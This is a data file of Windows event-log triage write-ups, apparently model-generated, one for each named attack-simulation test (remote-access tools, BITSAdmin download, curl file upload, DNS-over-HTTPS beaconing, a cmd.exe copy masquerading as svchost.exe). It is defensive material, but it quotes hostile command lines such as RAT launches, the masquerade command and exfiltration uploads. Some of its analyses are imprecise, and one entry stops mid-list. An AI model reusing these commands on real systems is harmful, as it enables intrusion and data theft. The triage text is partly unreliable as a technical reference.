   - The logs indicate the use of PowerShell to download and execute `GoToAssist.exe` from an external domain. While downloading executables via PowerShell is a common method used by administrative tools, it is also a known vector for delivering malware if not controlled. The command utilized `Invoke-WebRequest` to fetch the executable which is a standard method.

3. **Sysmon and Process Creation Events**:
   - There are several process creation logs associated with Sysmon events, including instances of PowerShell, whoami.exe, and conhost.exe, indicating command-line operations and potentially administrative tasks.
   - The execution of `whoami.exe` and `hostname.exe`, although common for user verification and hostname retrieval, can be part of a script for gathering information about the system.

4. **Edge Update Service**:
   - Multiple entries indicate activity related to Microsoft Edge Update, which is a legitimate process for updating the browser. There are instances of EdgeUpdate processes starting and stopping, which appears normal for system updates.

5. **Logon Events**:
   - The presence of login events and privilege escalation (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) confirms that user `admin_test` has administrative rights, which aligns with the PowerShell use.

6. **Security & Time Synchronization Events**:
   - Various logs show time synchronization and system service activities, which are usually benign unless done outside regular operations without proper authorization.

### Conclusion:
Based on the evidence collected from the logs, the activity appears primarily related to administrative tasks and legitimate software operations (LogMeIn/GoToAssist installations and usage). However, the use of PowerShell to download and execute external applications is noted as potentially risky behavior, often associated with both legitimate administrative activity and malicious operations, depending on the context and control measures in place.

### Final Resolution:
- **SUSPICIOUS**: The activity documented in the logs does not conclusively indicate malicious behavior but raises concern due to the aforementioned PowerShell downloads and executions. It's advisable to verify the legitimacy of the downloaded executables and confirm whether the activity aligns with authorized administrative tasks or user actions.

### Guidance:
- **Verification**: Confirm the legitimacy of the GoToAssist download and installation by checking against deployment policies or contacting the IT department.
- **Monitoring**: Increase monitoring on PowerShell activities and ensure Application Control Policies (e.g., AppLocker) are in place to restrict unauthorized execution.

Ammyy Admin Software Execution,"After carefully analyzing the provided Windows event logs, I have identified the following points that warrant attention:

1. **Use of PowerShell**: 
   - The Sysmon log and the Windows PowerShell log both show instances of PowerShell being used to execute a command. Specifically, the command `""powershell.exe"" & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\ammyy.exe\""}` is executed. This is suspicious because:
     - PowerShell is often used by attackers to execute scripts without writing them to disk.
     - `ammyy.exe` is a known remote desktop software which can be used for legitimate or malicious purposes.
     - The executable is located in a temporary folder, which is atypical for trusted applications.

2. **Running Unknown Executable**:
   - The logs indicate that `ammyy.exe` was executed from within a user’s temporary directory. Running an executable from such a location can be indicative of a malicious activity, especially if this action is not part of a known and acceptable process within the organization.

3. **Audit of Edge Updates**:
   - Many logs involve Microsoft Edge Update, but these actions do not raise immediate red flags, as they match the behavior of legitimate software updates. However, it is worth ensuring these updates are genuine and not being used as a conduit for unwanted software.

**Conclusion and Recommendations:**

- **Resolution**: **MALICIOUS**
  - The execution of `ammyy.exe` via PowerShell suggests potential unauthorized remote administration tool (RAT) usage, which is a common tactic used by attackers for remote access.

- **Recommendations**:
  1. Immediately investigate the source and intent of the `ammyy.exe` execution. Determine if this action was intentional and required by IT for remote administration or if it was unauthorized.
  2. Conduct a comprehensive endpoint security check on the system to ensure no unintended software is present.
  3. Review and possibly tighten PowerShell execution policies to block unauthorized use.
  4. Audit user activity for the user `SERVER002\\admin_test` to determine how `ammyy.exe` was introduced into the network.
  5. Verify the integrity of installed applications, particularly in areas frequently targeted by attackers.
  6. Assess network traffic around the time of execution to see if there were unusual outbound connections.

Given this conclusion, further investigation is necessary to contain and mitigate any potential security risks that this compromised host might pose to the network."
UltraViewer - RAT Execution,"Based on the given event logs, several activities raise potential concerns that indicate suspicious behavior and warrant further investigation:

1. **PowerShell Execution**: 
   - PowerShell was used to execute an application from the Temp directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\data_UltraViewer.exe` with a `/silent` argument. The silent execution can be indicative of potentially unwanted or malicious activities trying to evade detection.

2. **Suspicious Software Installation**:
   - The `UltraViewer` application is executed and multiple related processes like `UltraViewer_Desktop.exe`, `UltraViewer_Service.exe`, and supporting tasks are seen interacting with each other. The nature and purpose of the Ultraviewer application on this server need to be scrutinized because the execution context seems to be associated with a non-standard user (`admin_test`), executing from a temporary directory with silent install parameters.

3. **Usage of Administrative Privileges**:
   - The account `admin_test` is utilizing higher privilege tokens, which could be attempting to perform operations that require administrative permissions. 

4. **Process Termination**:
   - The use of `taskkill.exe` to terminate processes related to UltraViewer is notable. It could indicate either an attempt to stop a service post-installation to ensure it runs with specific parameters or configurations or an attempt to manage a conflict with existing processes.

5. **Multiple Instances of `RegAsm.exe`**:
   - .NET Assembly Registration Utility (`RegAsm.exe`) is frequently used, suggesting that DLLs associated with this software are being registered during its installation, which could be normal behavior for installation but still noteworthy considering the context.

6. **Network Activity**:
   - A log entry of a logon from an IP address (192.168.0.102), using NTLM as the authentication method, might indicate possible remote access sought by the application or administrative scripts. This might need cross-verification if an impacted network or asset is identified.

7. **Service Installation Logs**:
   - Entries like `UltraViewer Service` being configured and started indicate attempts to establish persistence on the system.

Given these considerations, the activities logged do not conclusively prove malicious intent alone, but their combination and circumstances propose potential risk. As such, it is critical to:

- Verify if UltraViewer was indeed authorized to be installed and if its usage is consistent with company policy.
- Investigate the `admin_test` account to ascertain recent account-related activities or anomalies.
- Check the network-facing service and logon details for any unauthorized access.

**Resolution**: SUSPICIOUS – The logs suggest activity that could indicate potential compromise or unauthorized behavior, thereby requiring additional investigation for certainty and action. It is recommended to monitor and potentially isolate the server until more definitive conclusions can be drawn."
RemotePC Software Execution,"### Analysis:

#### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - Multiple events showing PowerShell execution launching `RemotePC.exe` located in a temporary directory. This indicates an activity that often precedes malware execution or installation, as temporary directories are commonly used for such purposes.

2. **Service Installation:**
   - The `RPCService` was created with an automatic start, pointing to `RemotePCService.exe`. The installation of a service, particularly one that is set to start automatically without a known legitimate need, is a red flag for persistent mechanisms in malware.

3. **Installation and Uninstallation Activities:**
   - Numerous installation actions are present for various GUIDs, which appear to be related to the installation of `RemotePC` software. Such behavior could be indicative of software (legitimate or malicious) being both installed and possibly further configured or updated.

4. **Execution of Unknown Software:**
   - Processes related to `RemotePC` software (e.g., `RemotePCLauncher.exe`, `RPCFirewall.exe`) and other remote control tools were executed, which can be concerning if this software is not a known approved tool deployed within the company.

5. **Presence of Sysmon Logs:**
   - Events reveal the installation of a service with potential telemetry software. Considering the context and process descriptions, evidence points towards a high likelihood of possible dubious software installation and execution.
   
6. **Logon Events:**

Immediate action is required to isolate and investigate affected systems, alongside a complete review of network controls related to software installations.

"
Testing usage of uncommonly used port with PowerShell,"Upon reviewing the provided logs, here is a detailed analysis:

### Security Logs:
1. **Event ID 4624 (Logon):** This event indicates successful logins. Logon Type 5 is indicative of a service startup. The account 'SYSTEM' and host 'SERVER002$' are commonly used for system-level processes and are typically benign unless accompanied by unusual process execution or command-line arguments.
   
2. **Event ID 4672 (Special Privileges Assigned):** SYSTEM privileges are being exercised, which include high-level privileges expected for system operations. No unusual behaviors were noted in privilege usage.

3. **Event ID 4798 (Query for Group Membership):** Queries for group memberships of various accounts, including 'Administrator', which might suggest some administrative action but nothing explicit indicates a compromise in this context.

4. **Event ID 5379 (Credential Validation):** These errors (`ReturnCode=""3221226021""`) show failed credential reads, possibly system processes trying to access certain accounts. This might not be inherently suspicious without further context.

### Application Logs:
- No significant anomalies; normal operations like edge updates and system protection events.

### Windows PowerShell Logs:
- **Event ID 600:** Indicates the start of a process with the following command executed: `Test-NetConnection -ComputerName google.com -port 8081`. This could be to verify an external connection. This action is not inherently malicious but requires context.

### Sysmon Logs:
1. **Event ID 1 (Process Creation):** 
   - Legitimate Windows processes, like Edge Update or System processes, are being executed. The presence of `admin_test` executing processes is expected in an administrative context but should be verified.
   
2. **Event ID 5 (Process Termination):** Normal terminations for system processes.

### Analysis:
- **Anomalies Detected:** The PowerShell command `Test-NetConnection` directed at an external server (Google) raises questions, as this can be used in reconnaissance by attackers. The rest of the processes and logs appear to be typical system operations or administrative actions.

### Assessment and Resolution:
Based on the logs provided, we found certain actions that warrant attention, specifically the use of PowerShell for external connectivity testing. Although this could be a legitimate test conducted by an admin, it opens the possibility for misuse.

Thus, the resolution is **SUSPICIOUS**:
- **Actions Recommended:**
  - Review the origin and intention behind the PowerShell command. Confirm if it was an authorized administrative action.
  - Monitor for any repeated or additional use of similar commands.
  - Verify that system-level queries and operations from `admin_test` align with expected administrative activities.

This evaluation suggests further investigation to ensure activities align with standard operations and no signs of escalation or external threats persist."
UltraVNC Execution,"Upon reviewing the Windows event logs, several activities suggest potential indicators of malicious activity that warrant further investigation:

1. **Process Execution Patterns**:
   - The logs indicate multiple instances of the execution of `netsh.exe` to modify firewall settings, specifically adding port openings for TCP 5800 and 5900, and for allowing a program (`winvnc.exe`), which is often used for remote access. Such modifications to firewall rules are common in remote access tool deployments and should be carefully scrutinized to ensure they are legitimate.
   - The frequent use of `PowerShell` in the logs is worth noting, particularly with command lines that execute remote management tools. This includes the command that uses `PowerShell` to start `UltraVNC's vncviewer.exe`. Given `PowerShell's` flexibility and power, its use is frequently associated with both legitimate administrative tasks and malicious activity when used in lateral movement or remote execution contexts.
   - The presence of `setpasswd.exe` and `setcad.exe` from the `UltraVNC` folder being executed would likely relate to a configuration change of VNC services, such as passwords or server settings, which could be suspicious without proper authorization or context.

2. **Rapid Sequential Process Creation**:
   - The logs show a rapid succession of events occurring in a short timeframe for processes associated with `UltraVNC`, including the repeated spawning of `conhost.exe`. This could be indicative of automated script activity which might be deploying or configuring VNC software.

3. **User and Integrity Contexts**:
   - Many of these processes are running under the `SERVER002\admin_test` account with high integrity, suggesting execution from an administrative context. This could be legitimate if performed by an admin for setup purposes, but it may also suggest misuse if the account is compromised.

4. **Network Configuration Changes**:
   - Use of `netsh.exe` to add port openings for VNC-related software suggests intentional efforts to enable remote access on the specified ports. This is particularly suspicious if it wasn't a planned or permitted change and might align with remote management tool placement.

5. **Security Audit Event**:
   - The security log shows an event pertaining to querying of group memberships (Event ID 4798 for the Guest account), which though not inherently malicious, can be associated with reconnaissance activities by an entity trying to elevate privileges or understand the account landscape.

Given the outlined suspicious activities, these logs should proceed with further investigation to confirm the intent and legitimacy of actions. This involves:
- Verifying whether the firewall and process changes have been authorized and expected.
- Checking for any ongoing unauthorized remote access sessions or new firewall exceptions.
- Performing a review and possibly restriction or audit logging enhancement on the `admin_test` account.
- Setting alerts for related Sysmon events that demonstrate similar behaviors to catch potential malicious activity early.

Resolution: **SUSPICIOUS** - These activities suggest irregularities that need additional context and investigation to determine if they are benign or malicious. These actions could be legitimate for system setup, but also align with potential malicious behavior if they are unauthorized."
Psiphon,"Upon reviewing the provided Windows event logs, a few key observations can be made:

1. **PowerShell Activity:**
   - The logs indicate multiple instances of PowerShell execution, specifically under the user ""SERVER002\\admin_test"". Notably, PowerShell was used to run a script located in a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\script.bat`. This is an area of concern as scripts running from temporary file locations can sometimes indicate malicious activity, especially if they seem out of context or unexpected.

2. **Sysmon Logs:**
   - Several processes were executed by the user ""SERVER002\\admin_test"", which include `powershell.exe`, `conhost.exe`, and `wevtutil.exe`. While these executables themselves are not inherently malicious and are part of standard Windows operations, their invocation, particularly in quick succession and alongside scripts running from a temporary directory, could indicate potential scripting or automation used for malicious purposes.
   - Additionally, `whoami.exe` was executed, suggesting the potential for reconnaissance to determine logged-in users or system accounts with elevated privileges.
   - Wevtutil, a utility for managing Windows event logs, was used. This could be benign, but in a malicious context, it might be used to tamper with or delete log files.

3. **Security Logs:**
   - Multiple logon events seem consistent with system operations. However, an interesting point is several logons under the same session ID, potentially indicating scripted or automated tasks.
   - There is an event indicating the use of elevated privileges by the account ""SERVER002\\admin_test"", consistent with admin-level activity required for substantial system modifications.
    
4. **Activity Patterns and Artifacts:**
   - A prevalent sysmon event scenario shown here involves processes being spawned rapidly and using the `NT AUTHORITY\\SYSTEM` account, potentially pointing towards a script or task being executed at the system level, which could include software update tasks.

5. **Edge and SPP Activities:**
   - The execution entries for Edge updater and related processes appear as regular updates. Microsoft Edge's updater running often is indicative of scheduled updates and may not be suspicious itself, unless paired with out-of-context additional behaviors.

**Assessment:**
- **SUSPICIOUS**: Despite the presence of many benign processes, the use of PowerShell scripts from directories within `Temp`, rapid process creation, and services possibly running with modified privileges by an administrative user indicate activity that warrants further investigation. Each of these signatures separately could be benign or system-related, but when combined, they present a potentially suspicious pattern.

**Recommended Next Steps:**
1. Investigate the origin and contents of `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\script.bat` to understand its purpose and whether it was an expected execution.
2. Conduct a security review of user ""admin_test"" to ensure no unauthorized changes or accesses have been made.
3. Analyze network logs around the time stamps of suspicious entries to detect any anomalous connections or data exfiltration.
4. Continue monitoring for any similar patterns or recurrences of these activities to ensure system health and integrity.

Conclusively, while there is no definitive malicious behavior isolated, these entries elevate the importance of vigilant monitoring and additional scrutiny to preclude compromise."
svchost writing a file to a UNC path,"After examining the provided Windows event logs, here is a detailed analysis:

### Analysis:

1. **Event Overview**:
   - The logs primarily feature events related to process creation (EventID 1) and end (EventID 5), focusing on various system processes, including `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, `svchost.exe`, and Microsoft Edge Update-related processes.
   - These processes are executed by the user `SERVER002\\admin_test` with high integrity level, quite typical for administrative operations in a Windows environment.

2. **Suspicious Activities**:
   - One particularly notable event involving `cmd.exe` (EventID 1, ProcessId 5600) is:
     - **Command Line**: `\""cmd.exe\"" /c copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe & C:\\svchost.exe /c echo data > \\localhost\\c$\\data.txt`
     - This command copies `cmd.exe` to `svchost.exe` and executes it, which is a known technique to masquerade a malicious executable as a legitimate Windows process (`svchost.exe` is a common Windows service host process).
   
3. **Observed Process Behavior**:
   - **Process Chain**:
     - The parent process for many of these processes is `wsmprovhost.exe`, which is related to Windows Management Instrumentation.
     - Sequence of executed commands and the creation of processes like `whoami.exe`, `hostname.exe`, and use of `wevtutil.exe` suggest attempts to survey and potentially manipulate the environment by a user with high privileges.
   
4. **Time Synchronization**:
   - Time synchronization events from `Microsoft-Windows-Time-Service` and `Microsoft-Windows-Kernel-General` indicate standard NTP operations. However, the modification of system time can also be a nuanced red flag if tied to suspicious activity.

5. **Edge Update Process**:
   - Numerous Edge-related processes (`MicrosoftEdgeUpdate.exe`) were executed and seem to imply a regular update cycle for Microsoft Edge. Although extensive, these updates appear legitimate due to their association with `NT AUTHORITY\\SYSTEM`.

### Threat/Risk Assessment:

- **Indicators of Compromise**:
  - The usage of `cmd.exe` command that copies itself as `svchost.exe` stands out as highly suspicious and indicative of potential malicious activity or compromise.
  - Usage of high privilege processes to run reconnaissance commands (e.g., `whoami.exe`, `hostname.exe`) accentuates this suspicion.
  
### Resolution: **MALICIOUS**

### Guidance and Next Steps:

1. **Immediate Actions**:
   - **Containment**: Quarantine the affected machine to prevent further potential misuse or lateral movement in the network.
   - **Investigation**: Initiate a detailed forensic investigation, focusing on the intent and scope of the commands executed.
   - **Review Access Logs**: Identify any unusual logins or access patterns correlating to the identified user `SERVER002\\admin_test`.

2. **System Hardening**:
   - **Permissions Review**: Review and tighten permissions for administrative functions or high-integrity-level processes.
   - **Monitor and Alerting**: Implement monitoring and alerting for similar command-line parameters and privileged operations.

3. **Educate and Mitigate**:
   - **User Training**: Educate users about potential abuse scenarios hindered by elevated privileges.
   - **Regular Audits**: Routine checks on event logs to detect unconventional patterns early.

In conclusion, this assessment classifies the type of activities observed in the log files as malicious, and swift remediation steps are advised to curb potentially harmful impacts."

DNS over HTTPS Regular Beaconing,"Upon reviewing the provided log entries for potential signs of malicious activity, the following observations were made:

### Anomalous Behavior

1. **Repeated Time Change Events**:
   - The `Microsoft-Windows-Kernel-General` logs indicate multiple changes of the system time backward. This can be an indication of an attempt to disrupt forensic analysis or logs timeline tracking, which is a common tactic used in adversary techniques.
   - Events in the Security log (EventID 4616) further confirm the time adjustments.

2. **Use of PowerShell**:
   - There is a PowerShell event where a script (`data-doh-beacon.ps1`) is executed with command line arguments that seem to establish a DNS-based command and control communication (`-DohServer https://8.8.8.8/resolve`). This aligns closely with known adversarial techniques where PowerShell is utilized for remote communication or data exfiltration.
   - This script is executed from a temporary directory, which is unusual and often associated with script-based attacks.

3. **Processes Running with Elevated Privileges**:
   - User `admin_test` has logged in with high privileges (including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) and subsequently runs various console and utility processes (`wevtutil.exe`, `hostname.exe`, etc.). While these can be legitimate actions in some contexts, the combination with other behaviors (power shell script execution, time changes) raises concerns.

4. **Network Activity**:
   - The logs show connections being made over the network using NTLM authentication stemming from a remote device `DESKTOP-3HL5B2P`. This could potentially indicate an unauthorized lateral movement attempt or other remote-access activity.
   
### Assessment

- The specific PowerShell command execution with the downloaded script suggests potential malicious activity intending to establish command and control or gather information over DNS, a common method to bypass standard detection mechanisms.
- The time change events signify a possible effort to cover tracks or disrupt log-based investigations.
- The elevated privileges and associated activities conducted under the `admin_test` user account raise important concerns about potential privilege misuse.

### Resolution

**Resolution: MALICIOUS**

Given the execution of a potentially malicious PowerShell script, combined with the time manipulation and high-privileged process executions, there is a definite indication of malicious activity. Further investigation is needed to understand the full scope and impact:
- Immediate isolation of `Server002` to prevent potential propagation.
- Conduct a forensic analysis to determine any data exfiltration or additional payloads.
- Review network logs for additional signs of lateral movement or external connections.
- Implementation of additional monitoring and alerting around PowerShell and time change events.

The system should undergo a thorough review to ensure all backdoors or malicious scripts are detected and eradicated."
certreq download,"Upon reviewing the provided event logs, several notable processes and actions can be observed, which require detailed analysis to identify potential signs of compromise:

1. **Review of Key Processes and Events:**
   - **conhost.exe and wevtutil.exe:** There are numerous instances where `conhost.exe` and `wevtutil.exe` are executing with the `admin_test` user. While these are legitimate Windows processes, regular and repeated execution, especially for `wevtutil.exe` (which can be used for event log management), can be a sign of someone trying to manipulate or clear event logs.
   - **certreq and cmd.exe Execution:** The execution of `certreq.exe` through `cmd.exe` using parameters that seem to interact with external URLs (`https://example.com`) and local files like `%temp%\\file-license.txt` is highly unusual. This could potentially indicate an attempt for certificate manipulation or data exfiltration via seemingly legitimate tools.
   - **Microsoft Edge Updates:** The logs also display multiple instances concerning Microsoft Edge Update processes and installations (`MicrosoftEdgeUpdate.exe`, `setup.exe`), which, while expected as system operations, seem to involve multiple parent-child process chains in a short duration. Without specific updates known to be released at this time, this could be routine, though repeated installations and updates, particularly from temporary paths, warrant further review.
   - **Privilege Assignments and User Logons:** The system security logs indicate multiple logon events (Event ID 4624) and privilege assignments (Event ID 4672) for the `admin_test` user as well as system accounts. While `admin_test` appears to be a legitimate user, the presence of high-level privileges raises questions about whether these actions are expected and normal for this user role.
   - **Execution of HOSTNAME.EXE and WHOAMI.EXE:** These binaries have also run, typically innocuous for gathering basic system information but can indicate enumeration activity if used by unauthorized individuals.

2. **Assessment:**
   - The primary concern is the execution of `certreq` via `cmd.exe` related to an external URL which is atypical for routine system operations and can be associated with certificate hijacking or setups for further malicious communication.
   - The frequency and pattern of `wevtutil.exe` and `conhost.exe` executions are suspicious; these could be leveraged for operations involving event logs, potentially even event logs tampering or suppression activities.

3. **Conclusion and Resolution:**
   - Based on the combination of the unusual command-line executions, the potential misuse of typically benign Windows processes, and the significant privileges held by `admin_test`, these logs exhibit behavior inconsistent with typical operation profiles. Although there's no explicit evidence of a known exploit, toolkits, or malware, these indicators are suggestive of activities that could be leveraged for malicious purposes or unauthorized access.

Final Resolution: **SUSPICIOUS**

**Guidance:**
   - Investigate further into the `admin_test` account's activity; check for authorized use cases for high privilege levels.
   - Validate the legitimacy of certificate requests attempted via `certreq`.
   - Conduct a network traffic analysis to confirm if there's any genuine need or registration for outbound connections to external URLs.
   - Treat this assessment as an indicator for a potential security incident and prepare to employ necessary incident response actions."
Windows - BITSAdmin BITS Download,"After analyzing the provided Windows event logs, the entries demonstrate a largely benign operating environment with some events potentially warranting further scrutiny. Here is a detailed assessment:

1. **Time Change Events**: 
   - Multiple Security Log events (EventID 4616) indicate system time modifications, which are generally benign but can be used by attackers to cover tracks (e.g., timestomping). However, these changes were executed by the `LOCAL SERVICE` account via `svchost.exe` and seem consistent with normal system behavior, likely due to time synchronization.

2. **Edge Update**:
   - Several events in the Application and Sysmon logs are related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe`) running under `NT AUTHORITY\SYSTEM`. While generally benign, these events raise attention due to their elevated privileges. Nothing in these logs explicitly suggests malicious activity, but they should be monitored especially if updates were not expected at this time.

3. **Process Executions**:
   - The Sysmon logs show a sequence of executions involving `cmd.exe` and `bitsadmin.exe`. Specifically:
     ```
     ""CommandLine"": ""\""cmd.exe\"" /c C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH...""
     ```
   - This persistent use of `bitsadmin.exe` can indicate potential abuse as it might be downloading files from an external source (GitHub in this case). Although the file seems to be a LICENSE file (usually innocuous), this use of `bitsadmin` is a known attack vector (living off the land). It would be prudent to verify the legitimacy of the executed command and its expectedness within the environment.

4. **Common Process Executions**:
   - Regular executions involving `whoami.exe`, `conhost.exe`, and `wsmprovhost.exe` are observed. These are typically non-malicious observations related to user and session management.

5. **Wevtutil and Conhost Executions**: 
   - Multiple `wevtutil.exe` and `conhost.exe` invocations are noted. These typically aren't immediately suspicious without additional contextual information on their commands and usage by legitimate processes.

**Assessment and Resolution:**

Upon reviewing the logs:
- The use of `bitsadmin` to fetch a file, even if non-threat-bearing, is anomalous and merits further investigation to confirm its legitimacy and purpose within the organization. Given that it's coupled with an automated system process (likely a script or scheduled task), assessing whether this is routine or potentially out of place is crucial.
  
Therefore, the overall resolution based on the available log data is:

- **SUSPICIOUS** - There is no clear-cut malicious activity, but the `bitsadmin.exe` usage can be an indicator for further investigation to confirm it aligns with expected system processes."
MSP360 Connect Execution,"Based on the analysis of the provided Windows event logs, here are some key findings and observations:

1. **PowerShell Activity:**
   - There are multiple PowerShell activity logs indicating that `powershell.exe` was executed with a command to start `Connect.exe` from the environment variables path (`$env:ProgramFiles\\Connect\\Connect.exe`). The use of `Start-Process` to execute applications is common but can be suspicious if unusual software or scripts are being executed.

2. **Sysmon Logs:**
   - There were multiple executions of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe`, related to Microsoft Edge updates, initiated by the user `NT AUTHORITY\SYSTEM`. While these processes and their activity focus on updates, which is generally typical, the presence of files in temporary directories (like `EUD305.tmp`) can be a technique used by attackers to conduct operations in ephemeral locations.
   - Several processes like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` initiated by `SERVER002\admin_test` appear to be executed, which isn’t inherently suspicious, but can indicate script or automated tasks running, especially if the context is unknown.

3. **Systems and Application Logs:**
   - The application logs only show activity related to software protection and Edge update service stopped events. The software protection application log entry seems normal, indicating checks for licensing or activation, which is typical for Windows systems.
   - Stopping services can be suspicious if done outside regular update patterns, but the `edgeupdate` service could have been legitimately stopped after completing an update or due to a scheduled operation.

**Assessment:**
While specific logs and executions can be associated with regular system or scheduled activities, the following observations raise some concerns:
- Execution of PowerShell with an ambiguous command leading to `Connect.exe`.
- Multiple processes related to `edgeupdate` executed with system privileges.
- Use of PowerShell and system utilities without clear information on intent can be marked as potentially unusual depending on typical user behavior and enterprise policies.

Given these findings, the overall resolution for the log analysis is **SUSPICIOUS**. There are indicators that warrant further investigation to confirm normal system operations versus potential malicious activity. 

**Guidance:**
1. Verify the legitimacy of `Connect.exe` and its purpose on Server002.
2. Confirm whether the use of PowerShell and `MicrosoftEdgeUpdate.exe` fits the standard operation procedures by checking with system admins or IT policies.
3. Conduct user activity monitoring for `admin_test` to ascertain expected behaviors or roles.
4. Check for the presence of known good hash values or indicators for suspicious executable files involved (e.g., `EDGEUPDATE.exe`) to ensure authenticity.

Further investigation, including a deeper look at network connections or a review of other system artefacts like file changes or additional logs, can help conclude whether these events are indeed benign or if they potentially correlate with nefarious actions."
Curl Upload File,"### Analysis:

1. **High Frequency of Process Creation:** 
   - The logs indicate a high frequency of process creation events, especially involving utilities like `cmd.exe`, `powershell.exe`, and `curl.exe`, which are common tools used for automation and potentially malicious activities. 

2. **Command and Control Activity:**
   - There are multiple entries involving `curl.exe` which involves data transfer to `www.example.com` using commands like `-T`, `--upload-file`, `-d`, and `--data`. This signifies potential data exfiltration activities, which is a common indicator of malicious activity.

3. **Unusual PowerShell Execution:**
   - The `powershell.exe` running under `SERVER002\admin_test` with high integrity level could be indicative of suspicious activity, especially in the context of the other simultaneous events.

4. **Edge Update Service Anomaly:**
   - Numerous events involve `Microsoft Edge Update` related processes. Although updating browsers via services aren't uncommon, the high number of executions and the involvement of temporary directories (e.g., ""Temp\\EU91E5.tmp"") may require verification to ensure authenticity and to rule out any potential abuse or hijacking for malicious payload distribution.

5. **Excessive Usage of Windows Tools:**
   - Tools like `wevtutil.exe`, responsible for event log management, are seen being executed multiple times in a short span by a user with administrative privileges (`SERVER002\admin_test`). While potentially benign, in the absence of legitimate administrative tasks, this could indicate log deletion or tampering activities to cover tracks.

6. **Unexpected Network Connections:**
   - The command line used by `cmd.exe` to run `curl.exe` suggests file uploads to an external domain. Coupled with the fact that the session integrity is high, it indicates that the unauthorized file uploads are performed with elevated privileges.

### Assessment and Recommended Resolution:

Considering the pattern and frequency of the events, especially the use of `curl.exe` for potential data exfiltration, it's suggestive of an active threat within the environment. While one might verify the legitimacy of the `Microsoft Edge Update` processes and `curl` usage, the suspicious patterns meet several criteria for potential malicious activity.

**Resolution: MALICIOUS** 

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Disconnect the impacted host, `Server002`, from the network to prevent further data exfiltration or spread of potential malicious software.

2. **Forensic Analysis:**
   - Conduct a detailed forensic investigation on the host. Look for unusual binaries, scripts, or configurations and cross-reference hashes with known threat intelligence databases.

3. **Log Review:**
   - Analyze additional logs, focusing on network traffic, DNS queries to unknown domains, and endpoint behavior correlating with baseline activities before the suspect events.

4. **User Verification:**
   - Verify activities of `SERVER002\admin_test` to check if it’s a legitimate or compromised user. Check logs for any unauthorized access or privilege escalation.

5. **Security Patches and Updates:**
   - Ensure all systems are up-to-date with security patches to prevent exploitation of known vulnerabilities.

6. **Awareness and Training:**
   - Conduct an awareness session for admins and users on identifying phishing attempts, potential signs of compromise, and the importance of secure passwords.

By taking these steps, the organization can mitigate current risks and bolster defenses against similar threats in the future."
Splashtop Streamer Execution,"Upon reviewing the provided Windows event logs, we can make the following observations:

**1. PowerShell Usage:**
- There are multiple instances of PowerShell being executed by the user `SERVER002\admin_test`. Notably, the command executed was:  
  ```powershell
  powershell.exe & {Start-Process -FilePath \""C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRServer.exe\""}
  ```

  This command uses PowerShell to start a Splashtop Remote server process. Splashtop is a legitimate remote desktop application, and its usage could be legitimate if it is authorized by the organization. However, if this software was not expected or sanctioned, it might indicate unauthorized remote access attempts.

**2. Frequent Usage of 'wevtutil.exe' and 'conhost.exe':**
- The logs indicate multiple instances of `wevtutil.exe` and `conhost.exe` being executed within very short time frames. `Wevtutil.exe` is a command-line utility for managing event logs, and frequent execution of this tool may warrant further investigation to ensure logs are not being manipulated or cleared maliciously.
  
**3. Execution Context and User:**
- All actions are executed under the account `SERVER002\admin_test`, with a high integrity level, suggesting potential administrative privileges. The high integrity level is typical for administrative tasks, but it is important to verify if `admin_test` should have those privileges.

**4. Command Line Arguments:**
- The command line arguments for some processes, especially those involving PowerShell and `wevtutil`, may indicate attempts to manipulate or exfiltrate logs. However, without specific context on the normal usage patterns on this server, it's hard to definitively declare this as malicious without further context.

**Guidance and Recommendations:**
- **Verification with IT:** Check if `admin_test` is a recognized administrative user and verify if the execution of Splashtop Remote by this user was authorized.
- **Review Remote Application Use Policies:** Ensure the usage of remote tools like Splashtop aligns with company policy. 
- **Inspect 'wevtutil.exe' Usage:** Investigate if the use of `wevtutil.exe` is part of regular log management tasks or if it's suspicious.
- **Conduct a Full Security Audit:** If the authorization cannot be clearly established for the execution actions observed, consider doing a more in-depth audit of the server and user activities, possibly including network traffic analysis.

**Resolution Assessment:**
- **SUSPICIOUS**: While there is no definitive evidence of malicious intent from the logs alone, the activities observed, especially with the usage of PowerShell to launch Splashtop Remote processes and frequent `wevtutil.exe` executions, are suspicious and warrant further investigation to rule out any unauthorized activities or security breaches."
DNS Large Query Volume,"Upon thorough analysis of the provided logs, the following observations and conclusions can be drawn:

1. **Suspicious PowerShell Activity**:
   - The Sysmon log entry with event ID 1 for ""powershell.exe"" indicates it executed a script involving the use of `Resolve-DnsName` with a randomized domain that includes the loopback address ""127.0.0.1"", formatted as `""file-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io""`. This type of activity often resembles Domain Generation Algorithm (DGA) behavior, which can be employed in attempts to exfiltrate data or to simply test connectivity to local environments.

2. **Unusual Process Creation**:
   - Multiple instances of ""wevtutil.exe"" and ""conhost.exe"" being executed consecutively in a short period of time by the same user (""SERVER002\\admin_test"") can be considered unusual if not linked to known administrative tasks. While these utilities may be used for legitimate purposes, wevtutil may be used to clear event logs during malicious activities.

3. **Repeated and Automated Execution**:
   - The sequence of execution of ""wevtutil.exe"" and ""conhost.exe"" without any intervening entries can suggest a script or automated task running on the system, which requires further investigation.

4. **Elevation of Privileges**:
   - The security log shows multiple events indicating privilege escalation (Event ID 4672), where the user ""admin_test"" was granted high-privilege rights.

5. **Edge Update Activities**:
   - The logs show many instances of Microsoft Edge update processes, which appear regular but can be verified with legitimate update schedules.

**Assessment and Recommendations**:

